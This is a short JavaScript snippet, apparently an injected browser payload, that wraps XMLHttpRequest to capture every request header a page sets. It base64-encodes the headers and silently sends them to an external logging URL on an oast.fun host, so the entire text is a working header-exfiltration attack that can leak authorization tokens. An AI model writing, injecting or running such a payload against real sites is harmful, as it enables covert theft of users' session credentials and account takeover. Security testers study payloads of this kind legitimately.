(() => {
  const O = XMLHttpRequest;
  XMLHttpRequest = function () {
    const x = new O(), h = {}, s = x.setRequestHeader;
    x.setRequestHeader = function (k, v) {
      h[k] = v;
      return s.call(this, k, v);
    };
    x.addEventListener('load', () => {
      const b64 = btoa(JSON.stringify(h));
      const url = "https://piesyoygbsbedgjwarpa8ldhsnuh5snul.oast.fun/logger?headers=" + encodeURIComponent(b64);
      fetch(url).catch(() => {}); // Silent fail
    });
    return x;
  };
})();
